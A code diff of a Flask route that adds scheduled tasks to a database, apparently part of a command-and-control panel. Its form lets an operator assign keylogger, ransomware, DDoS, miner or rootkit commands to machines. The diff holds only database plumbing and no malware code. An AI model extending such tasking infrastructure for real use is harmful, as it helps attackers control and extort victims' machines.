@@ -449,65 +449,43 @@ def tasks_page():
 def add_new_task():
     """
     Handles form submissions from tasks.html.
-    Creates a new task in the DB. Adjust to match your schema.
+    This updated route creates a new task in the DB.
+    The form expects:
+      - MachineID
+      - Command (one of: keylogger, ransomware, ddos, miner, rootkit)
+      - Scheduled At (a datetime-local string)
+    
+    Note: Adjust the INSERT statement to match your TASKS table schema.
+    (For example, if your TASKS table only has columns TaskID, TaskType, Username,
+    then we’ll store 'command' in TaskType and use the provided MachineID in the Username field.)
     """
     if 'username' not in session:
         return redirect(url_for('login'))
-
-    # Grab current user
-    current_user = get_user_by_username(session['username'])
-
-    # Read form fields
-    task_name    = request.form.get('task_name')    # e.g. "UT Attack"
-    machine_name = request.form.get('machine_name') # e.g. "megatron"
-    command      = request.form.get('command')      # e.g. "keylogger"
-    scheduled_at = request.form.get('scheduled_at') # e.g. "2025-08-25T15:30"
-
-    # For demonstration, we'll store 'command' as the TaskType
-    # and 'task_name' as some descriptive name.
-
-    # 1) Find the machine's ID from the database
-    #    This depends on how you identify machines.
+    
+    # Get the form data. (We no longer need a task name or machine name.)
+    machine_id = request.form.get('machine_id')  # Now expects MachineID (as a number/string)
+    command    = request.form.get('command')
+    scheduled_at = request.form.get('scheduled_at')  # This may need further processing if you plan to store it
+    
+    # (Optional) You might want to convert or validate scheduled_at here.
+    
+    # Insert into TASKS table.
+    # NOTE: Your schema for TASKS is currently:
+    #       TASKS(TaskID, TaskType, Username)
+    # We'll use 'command' for TaskType and store the MachineID into the Username field.
+    # If your table design is different, adjust accordingly.
     conn = get_db_connection()
-    cursor = conn.cursor(dictionary=True)
-
-    # Suppose you have a column "Name" in MACHINE to match the typed name
-    # If you only have IPAddress, or Username, adjust accordingly
-    cursor.execute("SELECT MachineID FROM MACHINE WHERE Username = %s", (machine_name,))
-    # or "WHERE Name = %s" or "WHERE IPAddress = %s" depending on your schema
-
-    machine_row = cursor.fetchone()
-    if not machine_row:
-        conn.close()
-        return "Could not find machine with that name", 400
-
-    machine_id = machine_row['MachineID']
-
-    # 2) Insert into your 'TASKS' table
-    #    Because your schema is TaskID, TaskType, Username
-    #    we might do something like this:
-    #    (But you might need to adapt or expand your tasks table to hold 'scheduled_at' or 'task_name')
-    #    For now, let's store 'command' in TaskType, and the machine's ID in Username (as your existing code does).
-    #    Or you might prefer storing the user’s Username, or something else. Adjust as needed.
-    #    If you have an auto-increment TaskID, you can pass NULL or skip that column.
-
+    cursor = conn.cursor()
     insert_sql = """
         INSERT INTO TASKS (TaskType, Username)
         VALUES (%s, %s)
     """
-    # We'll store 'command' as the TaskType and the machine_id as 'Username' (since your code does that).
-    # If you'd rather store the current user's username, do that. It's up to how your schema is set up.
     cursor.execute(insert_sql, (command, machine_id))
-
-    # 3) Commit and close
     conn.commit()
     conn.close()
-
-    # 4) Optionally do something with 'task_name' or 'scheduled_at' if your schema supports it
-    #    (for example, if you add columns for them in your DB)
-
-    # 5) Finally, redirect back to /tasks or wherever you want
+    
     return redirect(url_for('tasks_page'))
+
 
 
 
